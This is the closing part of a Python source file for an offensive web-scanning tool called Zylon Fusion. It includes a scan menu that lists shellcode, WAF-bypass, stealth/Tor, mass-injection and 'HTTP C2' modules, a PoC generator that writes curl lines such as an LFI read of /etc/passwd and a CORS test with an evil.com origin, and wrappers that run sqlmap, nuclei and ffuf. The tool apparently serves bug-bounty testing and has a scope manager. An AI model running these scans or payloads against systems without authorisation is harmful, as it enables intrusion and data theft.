            '280': self._scan_cms_detect_adv,
            '281': self._scan_wp_deep,
            '282': self._scan_joomla_deep,
            '283': self._scan_drupal_deep,
            '284': self._scan_magento_adv,
            '285': self._scan_cms_default_creds,
            '286': self._scan_cms_full_adv,
            '287': self._scan_auto_decode_adv,
            '288': self._scan_encoding_chain,
            '289': self._scan_xor_crack,
            '290': self._scan_caesar_crack,
            '291': self._scan_crypto_frequency,
            '292': self._scan_crypto_full,
            '293': self._scan_ddos_cms_crypto_combined,
            '294': self._scan_ai_target_analysis,
            '295': self._scan_ai_attack_strategy,
            '296': self._scan_ai_payload_generation,
            '297': self._scan_ai_vuln_prioritization,
            '298': self._scan_ai_report_generation,
            '299': self._scan_ai_full_analysis,
            '300': self._scan_stealth_mode,
            '301': self._scan_tor_routed,
            '302': self._scan_proxy_chain,
            '303': self._scan_slow_mode,
            '304': self._scan_stealth_full,
            '305': self._scan_wordlist_target,
            '306': self._scan_wordlist_password,
            '307': self._scan_wordlist_subdomain,
            '308': self._scan_wordlist_username,
            '309': self._scan_wordlist_full,
            '310': self._scan_ai_stealth_combined,
            '311': self._scan_stealth_identity_rotation,
            '312': self._scan_ai_interpret_results,
            '313': self._scan_ai_stealth_wordlist_combined,
            '314': self._scan_dalfox_quick,
            '315': self._scan_dalfox_mass,
            '316': self._scan_dalfox_blind,
            '317': self._scan_dalfox_dom,
            '318': self._scan_dalfox_full,
            '319': self._scan_mass_dork,
            '320': self._scan_mass_sqli,
            '321': self._scan_mass_xss,
            '322': self._scan_multi_vuln,
            '323': self._scan_mass_file,
            '324': self._scan_bizlogic_price,
            '325': self._scan_bizlogic_payment,
            '326': self._scan_bizlogic_privilege,
            '327': self._scan_bizlogic_race,
            '328': self._scan_bizlogic_full,
            '329': self._scan_dalfox_params,
            '330': self._scan_mass_classify,
            '331': self._scan_bizlogic_cart,
            '332': self._scan_bizlogic_discount,
            '333': self._scan_mass_bizlogic_combined,
            '334': self._scan_ws_endpoint_discovery,
            '335': self._scan_ws_auth_testing,
            '336': self._scan_ws_message_fuzzing,
            '337': self._scan_ws_cross_origin,
            '338': self._scan_ws_full,
            '339': self._scan_h2c_detection,
            '340': self._scan_clte_detection,
            '341': self._scan_tecl_detection,
            '342': self._scan_smuggling_full,
            '343': self._scan_server_pp,
            '344': self._scan_client_pp,
            '345': self._scan_dom_clobber,
            '346': self._scan_pp_full,
            '347': self._scan_ws_dos,
            '348': self._scan_h2cl_detection,
            '349': self._scan_smuggling_timing,
            '350': self._scan_pp_gadget_chains,
            '351': self._scan_ws_message_replay,
            '352': self._scan_pp_json_body,
            '353': self._scan_ws_h2c_pp_combined,
            '354': self._scan_payload_db_browse,
            '355': self._scan_payload_search,
            '356': self._scan_gf_categorize,
            '357': self._scan_waf_bypass_payloads,
            '358': self._scan_payload_full_db,
            '359': self._scan_pattern_generation,
            '360': self._scan_rop_chain_helper,
            '361': self._scan_shellcode_generation,
            '362': self._scan_format_string_test,
            '363': self._scan_integer_overflow_test,
            '364': self._scan_exploit_dev_tools,
            '365': self._scan_image_exif_extraction,
            '366': self._scan_doc_metadata_extract,
            '367': self._scan_metadata_strip,
            '368': self._scan_opsec_check,
            '369': self._scan_privacy_risk_assessment,
            '370': self._scan_metadata_full_scan,
            '371': self._scan_payload_import_custom,
            '372': self._scan_payload_encode_bad_chars,
            '373': self._scan_payload_exploit_metadata_combined,
            '374': self._scan_bounty_program_mgmt,
            '375': self._scan_finding_classification,
            '376': self._scan_report_generation,
            '377': self._scan_scope_validation,
            '378': self._scan_bounty_full,
            '379': self._scan_cache_detection,
            '380': self._scan_cache_unkeyed,
            '381': self._scan_cache_header_poison,
            '382': self._scan_cache_deception,
            '383': self._scan_cache_poison_full,
            '384': self._scan_mobile_api,
            '385': self._scan_ssl_pinning,
            '386': self._scan_deep_links,
            '387': self._scan_webview_vulns,
            '388': self._scan_mobile_full,
            '389': self._scan_cache_param_cloaking,
            '390': self._scan_cache_fat_get,
            '391': self._scan_cert_pinning,
            '392': self._scan_apk_metadata,
            '393': self._scan_bounty_cache_mobile_combined,
            '42': self._scan_bounty_recon,
            '43': self._scan_bounty_vuln,
            '99': self._scan_mega,
            # V3 Security Engine (400-411)
            '400': self._scan_v3_graphql,
            '401': self._scan_v3_dom_xss,
            '402': self._scan_v3_cache_deception,
            '403': self._scan_v3_clickjacking,
            '404': self._scan_v3_account_takeover,
            '405': self._scan_v3_oauth,
            '406': self._scan_v3_http_method,
            '407': self._scan_v3_blind_xss,
            '408': self._scan_v3_2fa_bypass,
            '409': self._scan_v3_mixed_content,
            '410': self._scan_v3_info_disclosure,
            '411': self._scan_v3_full,
            # V4 Hunting Engine (412-419)
            '412': self._scan_v4_username_enum,
            '413': self._scan_v4_email_security,
            '414': self._scan_v4_csrf,
            '415': self._scan_v4_framework,
            '416': self._scan_v4_js_libraries,
            '417': self._scan_v4_403_bypass,
            '418': self._scan_v4_cross_domain,
            '419': self._scan_v4_cve_lookup,
            # V5 Async Engine (420-422)
            '420': self._scan_v5_subdomain_bruteforce,
            '421': self._scan_v5_dir_bruteforce,
            '422': self._scan_v5_smart,
            # HTTP C2 Server (423)
            '423': self._scan_http_c2,
            # External Tool Wrappers (424-427)
            '424': self._scan_nuclei,
            '425': self._scan_sqlmap_ext,
            '426': self._scan_sublist3r,
            '427': self._scan_ffuf,
        }

    def _scope_menu(self):
        """Bug Bounty Scope Manager"""
        console.print("\n[bold cyan][*] Bug Bounty Scope Manager[/bold cyan]")
        
        scope_file = os.path.join(get_home(), '.zylon', 'scope.json')
        scope = {}
        if os.path.exists(scope_file):
            try:
                with open(scope_file) as f:
                    scope = json.load(f)
            except Exception:
                scope = {}
        
        # Show current scope
        if scope:
            s_table = Table(title="Current Scope", box=box.ROUNDED, border_style="cyan")
            s_table.add_column("Domain", style="cyan")
            s_table.add_column("In-Scope", style="green")
            s_table.add_column("Out-of-Scope", style="red")
            s_table.add_column("Notes", style="yellow")
            for domain, info in scope.items():
                s_table.add_row(
                    domain,
                    ", ".join(info.get('in_scope', []))[:50],
                    ", ".join(info.get('out_scope', []))[:50],
                    info.get('notes', '')[:50]
                )
            console.print(s_table)
        else:
            console.print("[yellow][!] No scope defined yet[/yellow]")
        
        action = Prompt.ask("[yellow]Add/Remove/Check scope? (a/r/c)[/yellow]", default="c")
        if action.lower() == 'a':
            domain = Prompt.ask("[cyan]Target domain[/cyan]")
            in_scope = Prompt.ask("[green]In-scope patterns (comma-sep)[/green]", default="*")
            out_scope = Prompt.ask("[red]Out-of-scope patterns (comma-sep)[/red]", default="")
            notes = Prompt.ask("[yellow]Notes[/yellow]", default="")
            scope[domain] = {
                'in_scope': [s.strip() for s in in_scope.split(',') if s.strip()],
                'out_scope': [s.strip() for s in out_scope.split(',') if s.strip()],
                'notes': notes
            }
            os.makedirs(os.path.dirname(scope_file), exist_ok=True)
            with open(scope_file, 'w') as f:
                json.dump(scope, f, indent=2)
            console.print("[green][+] Scope saved![/green]")
        elif action.lower() == 'r':
            if scope:
                domain = Prompt.ask("[cyan]Domain to remove[/cyan]")
                if domain in scope:
                    del scope[domain]
                    with open(scope_file, 'w') as f:
                        json.dump(scope, f, indent=2)
                    console.print("[green][+] Scope removed![/green]")
        elif action.lower() == 'c':
            if self.target and scope:
                for domain, info in scope.items():
                    if domain in self.target:
                        in_pats = info.get('in_scope', ['*'])
                        out_pats = info.get('out_scope', [])
                        in_match = any(p == '*' or p in self.target for p in in_pats)
                        out_match = any(p in self.target for p in out_pats)
                        if in_match and not out_match:
                            console.print(f"[green][+] {self.target} is IN SCOPE for {domain}[/green]")
                        elif out_match:
                            console.print(f"[bold red][!] {self.target} is OUT OF SCOPE for {domain}![/bold red]")
                        else:
                            console.print(f"[yellow][?] {self.target} scope unclear for {domain}[/yellow]")

    def _poc_menu(self):
        """Generate PoC for last finding"""
        if not self.results or not self.results.get('findings'):
            console.print("[yellow][!] No scan results available. Run a scan first.[/yellow]")
            return
        
        findings = self.results.get('findings', {})
        if not findings:
            console.print("[yellow][!] No findings in last scan.[/yellow]")
            return
        
        console.print("\n[bold cyan][*] PoC Generator for Last Findings[/bold cyan]")
        
        # List available findings
        f_table = Table(title="Available Findings", box=box.ROUNDED)
        f_table.add_column("#", style="dim")
        f_table.add_column("Type", style="red")
        f_table.add_column("Details", style="cyan")
        finding_list = []
        for i, (ftype, fdata) in enumerate(findings.items(), 1):
            detail = ""
            if isinstance(fdata, dict):
                if fdata.get('vulnerable') or fdata.get('misconfigured') or fdata.get('detected') or fdata.get('exposed'):
                    detail = "VULNERABLE"
                elif fdata.get('findings'):
                    detail = f"{len(fdata['findings'])} findings"
                else:
                    detail = str(fdata)[:80]
            else:
                detail = str(fdata)[:80]
            f_table.add_row(str(i), ftype, detail[:60])
            finding_list.append((ftype, fdata))
        
        console.print(f_table)
        
        if not finding_list:
            console.print("[yellow][!] No exploitable findings to generate PoC for.[/yellow]")
            return
        
        choice = Prompt.ask("[yellow]Select finding # for PoC[/yellow]", default="1")
        try:
            idx = int(choice) - 1
            if 0 <= idx < len(finding_list):
                ftype, fdata = finding_list[idx]
                poc_content = self._generate_poc(ftype, fdata)
                if poc_content:
                    console.print(Panel(
                        f"[bold green]PoC Generated for: {ftype}[/bold green]\n\n{poc_content}",
                        title="[bold red] PROOF OF CONCEPT [/bold red]",
                        border_style="bold red",
                        box=box.HEAVY
                    ))
                    # Save PoC
                    poc_dir = os.path.join(get_home(), '.zylon', 'pocs')
                    os.makedirs(poc_dir, exist_ok=True)
                    poc_file = os.path.join(poc_dir, f"poc_{ftype}_{int(time.time())}.txt")
                    with open(poc_file, 'w') as f:
                        f.write(f"ZYLON FUSION - PoC for {ftype}\n")
                        f.write(f"Target: {self.target}\n")
                        f.write(f"Generated: {datetime.now().isoformat()}\n\n")
                        f.write(poc_content)
                    console.print(f"[green][+] PoC saved to: {poc_file}[/green]")
                else:
                    console.print(f"[yellow][!] Could not generate PoC for {ftype}[/yellow]")
        except (ValueError, IndexError):
            console.print("[red][!] Invalid selection[/red]")
    
    def _generate_poc(self, ftype, fdata):
        """Generate PoC content for a finding"""
        if not isinstance(fdata, dict):
            return None
        
        poc_lines = []
        target_url = f"{self.protocol}{self.target}"
        
        if ftype in ['sqli', 'sqli_detection'] and fdata.get('vulnerable'):
            poc_lines.append("SQL Injection PoC:")
            poc_lines.append(f"Target: {target_url}")
            for f in fdata.get('findings', [])[:3]:
                poc_lines.append(f"  Parameter: {f.get('parameter', 'unknown')}")
                poc_lines.append(f"  Payload: {f.get('payload', 'unknown')}")
                poc_lines.append(f"  Type: {f.get('type', 'unknown')}")
                poc_lines.append(f"  Evidence: {f.get('evidence', 'unknown')}")
                poc_lines.append(f"  Curl: curl '{target_url}?{f.get('parameter','id')}={f.get('payload','')}'")
        
        elif ftype in ['xss', 'xss_reflected'] and fdata.get('vulnerable'):
            poc_lines.append("XSS PoC:")
            poc_lines.append(f"Target: {target_url}")
            for f in fdata.get('findings', [])[:3]:
                poc_lines.append(f"  Parameter: {f.get('parameter', 'unknown')}")
                poc_lines.append(f"  Payload: {f.get('payload', 'unknown')}")
                poc_lines.append(f"  Type: {f.get('type', 'unknown')}")
                poc_lines.append(f"  Curl: curl '{target_url}?{f.get('parameter','q')}={f.get('payload','')}'")
        
        elif ftype in ['cors', 'cors_misconfig'] and fdata.get('misconfigured'):
            poc_lines.append("CORS Misconfiguration PoC:")
            poc_lines.append(f"Target: {target_url}")
            for f in fdata.get('findings', [])[:3]:
                poc_lines.append(f"  Origin: {f.get('origin', 'unknown')}")
                poc_lines.append(f"  ACAO: {f.get('acao', 'unknown')}")
                poc_lines.append(f"  ACAC: {f.get('acac', 'unknown')}")
                poc_lines.append(f"  Risk: {f.get('risk', 'unknown')}")
                poc_lines.append(f"  Curl: curl -H 'Origin: {f.get('origin','https://evil.com')}' '{target_url}'")
        
        elif ftype in ['open_redirect', 'open_redirect_adv'] and fdata.get('vulnerable'):
            poc_lines.append("Open Redirect PoC:")
            poc_lines.append(f"Target: {target_url}")
            for f in fdata.get('findings', [])[:3]:
                poc_lines.append(f"  Parameter: {f.get('parameter', 'unknown')}")
                poc_lines.append(f"  Redirects to: {f.get('redirects_to', 'unknown')}")
                poc_lines.append(f"  Curl: curl -v '{f.get('url', target_url)}'")
        
        elif ftype in ['lfi', 'lfi_detect'] and fdata.get('vulnerable'):
            poc_lines.append("LFI PoC:")
            poc_lines.append(f"Target: {target_url}")
            for f in fdata.get('findings', [])[:3]:
                poc_lines.append(f"  Parameter: {f.get('parameter', 'unknown')}")
                poc_lines.append(f"  Payload: {f.get('payload', 'unknown')}")
                poc_lines.append(f"  Curl: curl '{target_url}?{f.get('parameter','file')}={f.get('payload','/etc/passwd')}'")
        
        elif ftype in ['ssrf', 'ssrf_detect'] and fdata.get('vulnerable'):
            poc_lines.append("SSRF PoC:")
            poc_lines.append(f"Target: {target_url}")
            for f in fdata.get('findings', [])[:3]:
                poc_lines.append(f"  Parameter: {f.get('parameter', 'unknown')}")
                poc_lines.append(f"  Payload: {f.get('payload', 'unknown')}")
        
        else:
            # Generic PoC
            poc_lines.append(f"Vulnerability: {ftype}")
            poc_lines.append(f"Target: {target_url}")
            if fdata.get('vulnerable') or fdata.get('misconfigured') or fdata.get('detected'):
                poc_lines.append("Status: VULNERABLE")
                poc_lines.append(f"Data: {str(fdata)[:500]}")
            else:
                poc_lines.append("Status: No confirmed vulnerability")
                return None
        
        return "\n".join(poc_lines)

    # ========================================================================
    # ASYNC BATCH HTTP SCANNER (10-50x throughput for URL lists)
    # ========================================================================

    def _scan_async_batch(self, url_list, scan_type='headers', max_concurrent=20):
        """
        Async batch scanner: process a list of URLs concurrently.
        Uses aiohttp when available, falls back to ThreadPoolExecutor.

        scan_type options:
        - 'headers': Fetch and analyze HTTP headers
        - 'status': Just check status codes
        - 'body': Fetch and search body content
        - 'full': Headers + status + body analysis
        """
        results = []

        if AIOHTTP_AVAILABLE and aiohttp is not None:
            import asyncio

            async def _async_scan():
                connector = aiohttp.TCPConnector(limit=max_concurrent, ssl=False)
                timeout = aiohttp.ClientTimeout(total=15)
                async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                    sem = asyncio.Semaphore(max_concurrent)

                    async def _scan_url(url):
                        async with sem:
                            try:
                                async with session.get(url, allow_redirects=False) as resp:
                                    result = {'url': url, 'status': resp.status}
                                    if scan_type in ('headers', 'full'):
                                        result['headers'] = dict(resp.headers)
                                    if scan_type in ('body', 'full'):
                                        body = await resp.text()
                                        result['body_length'] = len(body)
                                        result['body_preview'] = body[:500]
                                    return result
                            except Exception as e:
                                return {'url': url, 'error': str(e)[:100]}

                    tasks = [_scan_url(u) for u in url_list]
                    return await asyncio.gather(*tasks, return_exceptions=True)

            try:
                loop = asyncio.get_event_loop()
                if loop.is_running():
                    # If already in async context, use ThreadPoolExecutor fallback
                    raise RuntimeError("Nested async")
                results = loop.run_until_complete(_async_scan())
            except RuntimeError:
                # Fallback: ThreadPoolExecutor
                results = self._sync_batch_scan(url_list, scan_type, max_concurrent)
        else:
            results = self._sync_batch_scan(url_list, scan_type, max_concurrent)

        return results

    def _sync_batch_scan(self, url_list, scan_type='headers', max_concurrent=20):
        """Synchronous fallback for batch scanning using ThreadPoolExecutor"""
        results = []
        lock = threading.Lock()

        def _scan_url(url):
            try:
                resp = self.perf_get(url)
                result = {'url': url, 'status': resp.status_code}
                if scan_type in ('headers', 'full'):
                    result['headers'] = dict(resp.headers)
                if scan_type in ('body', 'full'):
                    result['body_length'] = len(resp.text)
                    result['body_preview'] = resp.text[:500]
                return result
            except Exception as e:
                return {'url': url, 'error': str(e)[:100]}

        with ThreadPoolExecutor(max_workers=max_concurrent) as executor:
            futures = {executor.submit(_scan_url, u): u for u in url_list}
            for future in as_completed(futures):
                results.append(future.result())

        return results

    def _show_perf_stats(self):
        """Show performance statistics (DNS cache, threads, timeouts, etc.)"""
        console.print("\n[bold cyan][*] Performance Statistics[/bold cyan]")

        perf_table = Table(
            title="Performance Engine Stats",
            box=box.ROUNDED,
            border_style="bright_cyan",
            show_lines=True
        )
        perf_table.add_column("Component", style="bold yellow", width=25)
        perf_table.add_column("Status", style="white", width=40)
        perf_table.add_column("Details", style="dim", width=35)

        # DNS Cache
        if self.dns_cache:
            stats = self.dns_cache.stats()
            perf_table.add_row(
                "DNS Cache",
                f"[green]Active[/green] | Hit Rate: {stats['hit_rate']}",
                f"Entries: {stats['entries']} | Hits: {stats['hits']} | Misses: {stats['misses']}"
            )
        else:
            perf_table.add_row("DNS Cache", "[red]Disabled[/red]", "Install core.performance")

        # Connection Pool
        if self._perf_session:
            perf_table.add_row(
                "HTTP Connection Pool",
                f"[green]Active[/green] | Requests: {self._perf_session.request_count}",
                "Pool: 100 connections | 20 per host"
            )
        else:
            perf_table.add_row("HTTP Connection Pool", "[red]Disabled[/red]", "Using raw requests.Session")

        # Adaptive Threading
        if self.adaptive_threads:
            stats = self.adaptive_threads.stats()
            perf_table.add_row(
                "Adaptive Threading",
                f"[green]Active[/green] | Threads: {stats['current_threads']}",
                f"Success: {stats['success_count']} | Errors: {stats['error_count']} | Avg: {stats['avg_response_time']}"
            )
        else:
            perf_table.add_row("Adaptive Threading", "[red]Disabled[/red]", f"Using static: {MAX_THREADS} threads")

        # Rate Limiter
        if self.rate_limiter:
            perf_table.add_row(
                "Rate Limiter",
                f"[green]Active[/green] | Backoffs: {self.rate_limiter.backoff_count}",
                f"Rate: 20 req/s | In backoff: {self.rate_limiter.backoff_until > 0}"
            )
        else:
            perf_table.add_row("Rate Limiter", "[red]Disabled[/red]", "No rate limiting (WAF risk!)")

        # Smart Timeout
        if self.smart_timeout:
            stats = self.smart_timeout.stats()
            perf_table.add_row(
                "Smart Timeout",
                f"[green]Active[/green] | Current: {stats['current_timeout']}",
                f"Default: {stats['default_timeout']} | Samples: {stats['samples']}"
            )
        else:
            perf_table.add_row("Smart Timeout", "[red]Disabled[/red]", f"Using static: {DEFAULT_TIMEOUT}s")

        # Scan Dedup Cache
        dedup_entries = len(self._scan_cache)
        perf_table.add_row(
            "Scan Dedup Cache",
            f"[green]Active[/green] | Entries: {dedup_entries}",
            f"TTL: {self._scan_cache_ttl}s | Saves redundant re-scans"
        )

        # HTTP Response Cache
        http_entries = len(self._http_cache)
        perf_table.add_row(
            "HTTP Response Cache",
            f"[green]Active[/green] | Entries: {http_entries}",
            f"TTL: {self._http_cache_ttl}s | Avoids duplicate requests"
        )

        console.print(perf_table)

    def _search_scans(self, query):
        """Search scan types by keyword — fuzzy matching across names, descriptions, and groups"""
        if not query:
            console.print("[bold yellow][!] Enter a keyword to search[/bold yellow]")
            return

        query_lower = query.lower()
        matches = []

        # Search in help commands
        help_commands = [
            ("0", "Full Reconnaissance"), ("1", "WHOIS"), ("2", "Geo-IP"), ("3", "DNS"),
            ("9", "SQL Injection"), ("10", "XSS"), ("11", "Directory Brute Force"),
            ("13", "CORS"), ("30", "SSRF"), ("31", "SSTI"), ("32", "LFI"),
            ("40", "JWT"), ("99", "MEGA SCAN"),
        ]

        # Search SCAN_DESCRIPTIONS
        for scan_id, desc in self.SCAN_DESCRIPTIONS.items():
            if query_lower in desc.lower() or query_lower in scan_id:
                # Find which group this scan belongs to
                groups_for_scan = []
                for gid, ginfo in self.SCAN_GROUPS.items():
                    if scan_id in ginfo['scans']:
                        groups_for_scan.append(f"{gid}:{ginfo['name']}")
                matches.append((scan_id, desc, groups_for_scan))

        # Search group names and descriptions
        for gid, ginfo in self.SCAN_GROUPS.items():
            if query_lower in ginfo['name'].lower() or query_lower in ginfo['desc'].lower():
                matches.append((gid, f"[GROUP] {ginfo['name']} ({len(ginfo['scans'])} scans)", []))

        if not matches:
            console.print(f"[bold yellow][!] No scans found matching '{query}'[/bold yellow]")
            return

        # Display results
        search_table = Table(
            title=f"[bold yellow]Search Results for '{query}'[/bold yellow]",
            box=box.ROUNDED,
            border_style="bright_cyan",
            show_lines=True
        )
        search_table.add_column("ID", style="bold cyan", width=8)
        search_table.add_column("Scan Name", style="white", width=35)
        search_table.add_column("Groups", style="dim", width=30)

        # Deduplicate
        seen = set()
        for scan_id, desc, groups in matches:
            if scan_id not in seen:
                seen.add(scan_id)
                groups_str = ', '.join(groups[:3]) if groups else '-'
                search_table.add_row(scan_id, desc, groups_str)

        console.print(search_table)
        console.print(f"[bold green][+] {len(seen)} scan(s) found. Use the ID to run a scan.[/bold green]")

    # ========================================================================
    # RESUMABLE SCAN CHECKPOINT SYSTEM
    # ========================================================================

    def _save_checkpoint(self, group_id, scan_ids, completed_scans, all_results):
        """Save checkpoint for resumable group scans"""
        os.makedirs(self._checkpoint_dir, exist_ok=True)
        checkpoint = {
            'target': self.target,
            'group_id': group_id,
            'scan_ids': scan_ids,
            'completed_scans': completed_scans,
            'results': all_results,
            'timestamp': datetime.now().isoformat(),
            'version': ZYLON_VERSION,
        }
        checkpoint_file = os.path.join(self._checkpoint_dir, f"{self.target}_{group_id}_checkpoint.json")
        try:
            with open(checkpoint_file, 'w') as f:
                json.dump(checkpoint, f, indent=2, default=str)
            self._current_checkpoint = checkpoint_file
        except Exception as e:
            console.print(f"[dim yellow][!] Checkpoint save failed: {str(e)[:50]}[/dim yellow]")

    def _load_checkpoint(self, group_id):
        """Load checkpoint for resuming a group scan"""
        checkpoint_file = os.path.join(self._checkpoint_dir, f"{self.target}_{group_id}_checkpoint.json")
        if os.path.exists(checkpoint_file):
            try:
                with open(checkpoint_file, 'r') as f:
                    return json.load(f)
            except Exception:
                return None
        return None

    def _clear_checkpoint(self, group_id=None):
        """Clear checkpoint(s) after successful completion"""
        if group_id:
            checkpoint_file = os.path.join(self._checkpoint_dir, f"{self.target}_{group_id}_checkpoint.json")
            try:
                os.remove(checkpoint_file)
            except Exception:
                pass
        else:
            # Clear all checkpoints for current target
            try:
                for f in os.listdir(self._checkpoint_dir):
                    if f.startswith(self.target):
                        os.remove(os.path.join(self._checkpoint_dir, f))
            except Exception:
                pass

    def _list_checkpoints(self):
        """List all available checkpoints for resuming"""
        if not os.path.exists(self._checkpoint_dir):
            console.print("[yellow][!] No checkpoints found[/yellow]")
            return

        checkpoints = [f for f in os.listdir(self._checkpoint_dir) if f.endswith('_checkpoint.json')]
        if not checkpoints:
            console.print("[yellow][!] No checkpoints found[/yellow]")
            return

        cp_table = Table(title="Available Checkpoints", box=box.ROUNDED, border_style="yellow")
        cp_table.add_column("Target", style="cyan")
        cp_table.add_column("Group", style="yellow")
        cp_table.add_column("Completed", style="green")
        cp_table.add_column("Date", style="dim")

        for cp_file in checkpoints:
            try:
                with open(os.path.join(self._checkpoint_dir, cp_file), 'r') as f:
                    data = json.load(f)
                cp_table.add_row(
                    data.get('target', '?'),
                    data.get('group_id', '?'),
                    f"{len(data.get('completed_scans', []))}/{len(data.get('scan_ids', []))}",
                    data.get('timestamp', '?')[:19]
                )
            except Exception:
                pass

        console.print(cp_table)
        console.print("[cyan]Use 'resume <target> <group_id>' to resume a checkpoint[/cyan]")

    # ========================================================================
    # EXTERNAL TOOL WRAPPERS (nuclei, sqlmap, sublist3r, etc.)
    # ========================================================================

    def _check_tool(self, tool_name):
        """Check if an external tool is installed and available"""
        try:
            import subprocess
            result = subprocess.run(['which', tool_name], capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                return result.stdout.strip()
        except Exception:
            pass
        return None

    def _run_external(self, tool_name, args, target=None):
        """Run an external tool with given arguments, capturing output"""
        import subprocess
        tool_path = self._check_tool(tool_name)
        if not tool_path:
            console.print(f"[bold red][!] {tool_name} not found. Install with: pkg install {tool_name} or pip install {tool_name}[/bold red]")
            return None

        cmd = [tool_path] + args
        if target:
            console.print(f"[cyan][*] Running {tool_name} on {target}...[/cyan]")
        else:
            console.print(f"[cyan][*] Running {tool_name}...[/cyan]")

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            output = result.stdout + result.stderr
            return {
                'tool': tool_name,
                'cmd': ' '.join(cmd),
                'returncode': result.returncode,
                'output': output[:10000],  # Truncate large output
                'target': target,
                'timestamp': datetime.now().isoformat(),
            }
        except subprocess.TimeoutExpired:
            console.print(f"[bold yellow][!] {tool_name} timed out after 300s[/bold yellow]")
            return {'tool': tool_name, 'error': 'Timeout after 300s'}
        except Exception as e:
            console.print(f"[bold red][!] {tool_name} error: {str(e)[:100]}[/bold red]")
            return {'tool': tool_name, 'error': str(e)[:200]}

    def _scan_nuclei(self):
        """424: Nuclei Scanner (External)"""
        url = f"{self.protocol}{self.target}"
        if self._check_tool('nuclei'):
            result = self._run_external('nuclei', ['-u', url, '-severity', 'medium,high,critical', '-silent'], self.target)
            if result:
                self.results['findings']['nuclei'] = result
                vulns = result.get('output', '').count('[') if result.get('output') else 0
                console.print(f"[bold green][+] Nuclei scan complete. ~{vulns} findings[/bold green]")
        else:
            console.print("[yellow][!] Nuclei not installed. Install: go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest[/yellow]")
            console.print("[dim]    Or: apt install nuclei[/dim]")

    def _scan_sqlmap_ext(self):
        """425: SQLMap (External)"""
        url = f"{self.protocol}{self.target}"
        if self._check_tool('sqlmap'):
            result = self._run_external('sqlmap', ['-u', url, '--batch', '--random-agent', '--level', '3'], self.target)
            if result:
                self.results['findings']['sqlmap_ext'] = result
                if 'is vulnerable' in result.get('output', ''):
                    console.print("[bold green][+] SQLMap found SQL injection![/bold green]")
                else:
                    console.print("[dim][-] SQLMap: No injection found[/dim]")
        else:
            console.print("[yellow][!] SQLMap not installed. Install: pip install sqlmap[/yellow]")

    def _scan_sublist3r(self):
        """426: Sublist3r (External)"""
        domain = self.target.replace('www.', '').split(':')[0]
        if self._check_tool('sublist3r'):
            result = self._run_external('sublist3r', ['-d', domain, '-t', '10'], domain)
            if result:
                self.results['findings']['sublist3r'] = result
                console.print("[bold green][+] Sublist3r scan complete[/bold green]")
        else:
            console.print("[yellow][!] Sublist3r not installed. Install: pip install sublist3r[/yellow]")

    def _scan_ffuf(self):
        """427: FFUF Fuzzer (External)"""
        url = f"{self.protocol}{self.target}"
        if self._check_tool('ffuf'):
            # Use a basic wordlist if available
            wordlist = '/usr/share/wordlists/dirb/common.txt'
            if not os.path.exists(wordlist):
                wordlist = os.path.join(DATA_DIR, 'wordlists', 'directories.txt')
            if os.path.exists(wordlist):
                result = self._run_external('ffuf', ['-u', f'{url}/FUZZ', '-w', wordlist, '-mc', '200,301,302,403', '-t', '20'], self.target)
                if result:
                    self.results['findings']['ffuf'] = result
                    console.print("[bold green][+] FFUF scan complete[/bold green]")
            else:
                console.print("[yellow][!] No wordlist found for FFUF[/yellow]")
        else:
            console.print("[yellow][!] FFUF not installed. Install: go install github.com/ffuf/ffuf/v2@latest[/yellow]")

    def _tools_status(self):
        """Show which external tools are installed"""
        tools = ['nuclei', 'sqlmap', 'sublist3r', 'ffuf', 'nmap', 'gobuster',
                 'dirsearch', 'masscan', 'nikto', 'whatweb', 'wpscan',
                 'hydra', 'medusa', 'john', 'hashcat', 'subfinder',
                 'httpx', 'dnsx', 'naabu', 'crobat']

        console.print("\n[bold cyan][*] External Tool Status[/bold cyan]")
        tool_table = Table(box=box.ROUNDED, border_style="cyan")
        tool_table.add_column("Tool", style="yellow", width=15)
        tool_table.add_column("Status", style="bold", width=12)
        tool_table.add_column("Path", style="dim", width=40)

        available = 0
        for tool in tools:
            path = self._check_tool(tool)
            if path:
                tool_table.add_row(tool, "[green]INSTALLED[/green]", path)
                available += 1
            else:
                tool_table.add_row(tool, "[red]NOT FOUND[/red]", "-")

        console.print(tool_table)
        console.print(f"[bold green][+] {available}/{len(tools)} external tools available[/bold green]")

    def _config_menu(self):
        """Configuration menu for API keys"""
        console.print("\n[bold cyan][*] Configuration Manager[/bold cyan]")
        console.print("[cyan]Current API key status:[/cyan]")
        
        config_file = os.path.join(get_home(), '.zylon', 'config.json')
        config = {}
        if os.path.exists(config_file):
            with open(config_file) as f:
                config = json.load(f)
        
        keys = ['shodan_api_key', 'virustotal_api_key', 'hunter_api_key', 
                'securitytrails_api_key', 'censys_api_id', 'censys_api_secret',
                'github_api_key', 'ai_api_key']
        
        k_table = Table(box=box.ROUNDED, border_style="cyan")
        k_table.add_column("API Key", style="yellow")
        k_table.add_column("Status", style="green")
        for key in keys:
            val = config.get(key, '')
            status = "[green]Set[/green]" if val else "[red]Not Set[/red]"
            k_table.add_row(key, status)
        console.print(k_table)
        
        action = Prompt.ask("[yellow]Set API key? (y/n)[/yellow]", default="n")
        if action.lower() == 'y':
            key_name = Prompt.ask("[yellow]API key name[/yellow]")
            key_val = Prompt.ask("[yellow]API key value[/yellow]")
            config[key_name] = key_val
            
            os.makedirs(os.path.dirname(config_file), exist_ok=True)
            with open(config_file, 'w') as f:
                json.dump(config, f, indent=2)
            console.print("[green][+] API key saved![/green]")
    
    def _report_menu(self):
        """Report viewing menu"""
        reports_dir = os.path.join(get_home(), '.zylon', 'reports')
        if os.path.exists(reports_dir):
            reports = [f for f in os.listdir(reports_dir) if f.endswith('.json')]
            if reports:
                r_table = Table(title="Previous Scan Reports", box=box.ROUNDED)
                r_table.add_column("#", style="dim")
                r_table.add_column("Report", style="cyan")
                for i, r in enumerate(reports[-20:], 1):
                    r_table.add_row(str(i), r)
                console.print(r_table)
            else:
                console.print("[yellow][!] No reports found[/yellow]")
        else:
            console.print("[yellow][!] No reports directory found[/yellow]")


# ============================================================================
# ENTRY POINT
# ============================================================================

if __name__ == "__main__":
    try:
        zylon = ZylonFusion()
        zylon.run()
    except Exception as e:
        console.print(f"[bold red][FATAL] {str(e)}[/bold red]")
        sys.exit(1)
